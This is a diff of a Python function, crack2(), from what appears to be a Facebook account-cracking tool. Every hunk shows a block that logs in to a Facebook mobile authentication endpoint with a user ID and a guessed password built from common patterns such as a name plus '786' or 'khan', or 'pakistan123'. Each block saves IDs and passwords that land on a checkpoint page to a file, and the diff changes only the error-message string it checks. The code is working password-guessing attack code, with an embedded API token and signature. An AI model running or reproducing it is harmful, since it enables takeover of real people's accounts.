@@ -330,7 +330,7 @@ def crack2():
 		    pass1=name+"786"
 		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		    d=json.loads(q)
-		    if 'www.facebook.com' in d['error_msg']:
+		    if 'm.facebook.com' in d['error_msg']:
 		        print("[CP] "+uid+" | "+pass1)
 		        cp=open("save/cp.txt","a")
 		        cp.write(uid+" | "+pass1+"\n")
@@ -347,7 +347,7 @@ def crack2():
 		            pass2="786786"
 		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		            d=json.loads(q)
-		            if 'www.facebook.com' in d['error_msg']:
+		            if 'm.facebook.com' in d['error_msg']:
 		                print("[CP] "+uid+" | "+pass2)
 		                cp=open("save/cp.txt","a")
 		                cp.write(uid+" | "+pass2+"\n")
@@ -364,7 +364,7 @@ def crack2():
 		                    pass3="000786"
 		                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                    d=json.loads(q)
-		                    if 'www.facebook.com' in d['error_msg']:
+		                    if 'm.facebook.com' in d['error_msg']:
 		                        print("[CP] "+uid+" | "+pass3)
 		                        cp=open("save/cp.txt","a")
 		                        cp.write(uid+" | "+pass3+"\n")
@@ -381,7 +381,7 @@ def crack2():
 		                            pass4="123"
 		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                            d=json.loads(q)
-		                            if 'www.facebook.com' in d['error_msg']:
+		                            if 'm.facebook.com' in d['error_msg']:
 		                                print("[CP] "+uid+" | "+pass4)
 		                                cp=open("save/cp.txt","a")
 		                                cp.write(uid+" | "+pass4+"\n")
@@ -398,7 +398,7 @@ def crack2():
 		                                    pass5=name+"1234"
 		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                                    d=json.loads(q)
-		                                    if 'www.facebook.com' in d['error_msg']:
+		                                    if 'm.facebook.com' in d['error_msg']:
 		                                        print("[CP] "+uid+" | "+pass5)
 		                                        cp=open("save/cp.txt","a")
 		                                        cp.write(uid+" | "+pass5+"\n")
@@ -415,7 +415,7 @@ def crack2():
 		                                            pass6=name+"12345"
 		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                                            d=json.loads(q)
-		                                            if 'www.facebook.com' in d['error_msg']:
+		                                            if 'm.facebook.com' in d['error_msg']:
 		                                                print("[CP] "+uid+" | "+pass6)
 		                                                cp=open("save/cp.txt","a")
 		                                                cp.write(uid+" | "+pass6+"\n")
@@ -432,7 +432,7 @@ def crack2():
 		                                                    pass7=name+"1122"
 		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                                                    d=json.loads(q)
-		                                                    if 'www.facebook.com' in d['error_msg']:
+		                                                    if 'm.facebook.com' in d['error_msg']:
 		                                                        print("[CP] "+uid+" | "+pass7)
 		                                                        cp=open("save/cp.txt","a")
 		                                                        cp.write(uid+" | "+pass7+"\n")
@@ -449,7 +449,7 @@ def crack2():
 		                                                    	    pass8="pakistan"
 		                                                    	    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass8 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                                                            d=json.loads(q)
-		                                                            if 'www.facebook.com' in d['error_msg']:
+		                                                            if 'm.facebook.com' in d['error_msg']:
 		                                                                print("[CP] "+uid+" | "+pass8)
 		                                                                cp=open("save/cp.txt","a")
 		                                                                cp.write(uid+" | "+pass8+"\n")
@@ -466,7 +466,7 @@ def crack2():
 		                                                    	            pass9=name+"jan"
 		                                                    	            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass9 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                                                                    d=json.loads(q)
-		                                                                    if 'www.facebook.com' in d['error_msg']:
+		                                                                    if 'm.facebook.com' in d['error_msg']:
 		                                                                        print("[CP] "+uid+" | "+pass9)
 		                                                                        cp=open("save/cp.txt","a")
 		                                                                        cp.write(uid+" | "+pass9+"\n")
@@ -483,7 +483,7 @@ def crack2():
 		                                                    	                    pass10=name+"khan"
 		                                                    	                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass10 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                                                                            d=json.loads(q)
-		                                                                            if 'www.facebook.com' in d['error_msg']:
+		                                                                            if 'm.facebook.com' in d['error_msg']:
 		                                                                                print("[CP] "+uid+" | "+pass10)
 		                                                                                cp=open("save/cp.txt","a")
 		                                                                                cp.write(uid+" | "+pass7+"\n")
@@ -500,7 +500,7 @@ def crack2():
 		                                                    	                  	    pass11=name+"143"
 		                                                    	                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass11 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                                                                                    d=json.loads(q)
-		                                                                                    if 'www.facebook.com' in d['error_msg']:
+		                                                                                    if 'm.facebook.com' in d['error_msg']:
 		                                                                                        print("[CP] "+uid+" | "+pass11)
 		                                                                                        cp=open("save/cp.txt","a")
 		                                                                                        cp.write(uid+" | "+pass11+"\n")
@@ -517,7 +517,7 @@ def crack2():
 		                                                    	                  	            pass12="pakistan123"
 		                                                    	                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass12 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                                                                                            d=json.loads(q)
-		                                                                                            if 'www.facebook.com' in d['error_msg']:
+		                                                                                            if 'm.facebook.com' in d['error_msg']:
 		                                                                                                print("[CP] "+uid+" | "+pass12)
 		                                                                                                cp=open("save/cp.txt","a")
 		                                                                                                cp.write(uid+" | "+pass12+"\n")
